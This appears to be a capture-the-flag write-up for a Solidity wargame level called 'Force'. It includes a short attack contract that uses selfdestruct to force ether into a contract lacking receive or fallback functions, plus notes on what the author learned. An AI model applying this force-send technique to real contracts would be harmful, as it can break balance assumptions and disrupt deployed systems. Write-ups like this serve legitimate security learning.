# Force Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

# Solution
This contract was a bit tricky to me at first. As a empty contract, it has to contructor, functions and most importantly it has no fallback() or recieve() functions.
I attempted to send money to the contract anyways....did nothing. But there is something called a selfdestruct() function in solidity. This function is exactly what its name says.
It destroys the contract but also sends and remaining value to the contract. In Remix, before deploying the contract we will set its value to 100 Wei(or some other value) 
and use the following contract:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
```

# What I learned
1. Even if a contract does not have fallbacks or recieves, there are still ways to send it value. Although with risk.
2. It is possible to deploy an empty contract.
3. The difference between send(), sendTransaction(), transfer() and call()
